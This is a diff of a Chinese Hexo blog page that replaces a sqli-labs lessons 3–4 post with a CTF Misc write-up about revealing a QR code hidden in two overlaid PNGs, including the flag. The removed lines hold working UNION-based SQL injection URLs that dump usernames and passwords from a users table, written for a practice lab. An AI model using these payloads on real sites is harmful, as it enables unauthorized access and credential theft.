@@ -6,21 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://xyel.ml">
-  <title>sqli-lab03&amp;04 | xyel的Hexo小站</title>
+  <title>0xCTF-Misc2 | xyel的Hexo小站</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="sqli-lab学习过程03&amp;04Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）">
+  <meta name="description" content="0xCTF-Misc2different Pic">
 <meta property="og:type" content="article">
-<meta property="og:title" content="sqli-lab03&amp;04">
-<meta property="og:url" content="https://xyel.ml/sqli-lab03-04.html">
+<meta property="og:title" content="0xCTF-Misc2">
+<meta property="og:url" content="https://xyel.ml/0xCTF-Misc2.html">
 <meta property="og:site_name" content="xyel的Hexo小站">
-<meta property="og:description" content="sqli-lab学习过程03&amp;04Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）">
+<meta property="og:description" content="0xCTF-Misc2different Pic">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-09-16T02:39:35.000Z">
-<meta property="article:modified_time" content="2020-09-16T15:14:40.061Z">
+<meta property="article:published_time" content="2020-10-10T14:45:53.000Z">
+<meta property="article:modified_time" content="2020-10-10T14:52:05.860Z">
 <meta property="article:author" content="xyel">
 <meta property="article:tag" content="CTF">
-<meta property="article:tag" content="Web">
-<meta property="article:tag" content="SQL">
+<meta property="article:tag" content="Misc">
 <meta name="twitter:card" content="summary">
   
   
@@ -151,33 +150,45 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-sqli-lab03-04" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-0xCTF-Misc2" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      sqli-lab03&amp;04
+      0xCTF-Misc2
     </h1>
   
 
         
-        <a href="/sqli-lab03-04.html" class="archive-article-date">
-  	<time datetime="2020-09-16T02:39:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-16</time>
+        <a href="/0xCTF-Misc2.html" class="archive-article-date">
+  	<time datetime="2020-10-10T14:45:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-10-10</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="sqli-lab学习过程03-amp-04"><a href="#sqli-lab学习过程03-amp-04" class="headerlink" title="sqli-lab学习过程03&amp;04"></a>sqli-lab学习过程03&amp;04</h1><h2 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)"></a>Less-3 GET - Error based - Single quotes with twist string (基于错误的GET单引号变形字符型注入)</h2><h2 id="Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）"><a href="#Less-4-GET-Error-based-Double-Quotes-String-（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）"></a>Less-4 GET - Error based - Double Quotes - String （基于错误的GET双引号字符型注入）</h2><a id="more"></a>
+        <h1 id="0xCTF-Misc2"><a href="#0xCTF-Misc2" class="headerlink" title="0xCTF-Misc2"></a>0xCTF-Misc2</h1><h2 id="different-Pic"><a href="#different-Pic" class="headerlink" title="different Pic"></a>different Pic</h2><a id="more"></a>
 
-<p>less-3是select … from … where id=(‘1’) …</p>
-<p>less-4是select … from … where id=(”1”) …</p>
-<p>less-3 ： <a target="_blank" rel="noopener" href="http://e.ee/s/Less-3/?id=-3%27)%20union%20select%20null,null,(select%20group_concat(username,0x3a,password)%20from%20users)%23">http://e.ee/s/Less-3/?id=-3%27)%20union%20select%20null,null,(select%20group_concat(username,0x3a,password)%20from%20users)%23</a></p>
-<p>less-4 ： <a target="_blank" rel="noopener" href="http://e.ee/s/Less-4/?id=-3%22)%20union%20select%20null,null,(select%20group_concat(username,0x3a,password)%20from%20users)%23">http://e.ee/s/Less-4/?id=-3%22)%20union%20select%20null,null,(select%20group_concat(username,0x3a,password)%20from%20users)%23</a></p>
-<p><code>注意这里是双引号%22而不是两个单引号%27</code></p>
+<p>首先题目给出两张图片</p>
+<p>很明显  一张图片较小  为原图  一张图片较大  命名为flag.png</p>
+<p>这是一道png隐写</p>
+<p>老规矩先扔Stegsolve</p>
+<p>我们一番操作下来并没有收获</p>
+<p>然后我们根据两张图片的线索</p>
+<p>推测可能是图片合成</p>
+<p>使用image combiner将两张图片重叠</p>
+<p>会发现两张图片并不完全一样</p>
+<p>由此往下继续调整rgb</p>
+<p>直至出现答案   一个隐写在其中的二维码</p>
+<p>二维码是被我认出来了  但我手机不认</p>
+<p>找了个看的最清楚的黑白  扔到mspaint补了几笔</p>
+<p>成功扫出</p>
+<blockquote>
+<p>flag: 0xGame{a_little_different}</p>
+</blockquote>
 
       
 
@@ -195,11 +206,7 @@
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">SQL</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Misc</a>
         		</li>
       		
 		</ul>
@@ -255,7 +262,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://xyel.ml/sqli-lab03-04.html" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://xyel.ml/0xCTF-Misc2.html" alt="微信分享二维码">
     </div>
 </div>
 
@@ -269,18 +276,9 @@
   
 <nav id="article-nav">
   
-    <a href="/0xCTF-Web.html" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          0xCTF-Web
-        
-      </div>
-    </a>
   
-  
-    <a href="/sqli-lab02.html" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">sqli-lab02</div>
+    <a href="/0xCTF-Crypto.html" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">0xCTF-Crypto</div>
       <i class="icon-circle-right"></i>
     </a>
   
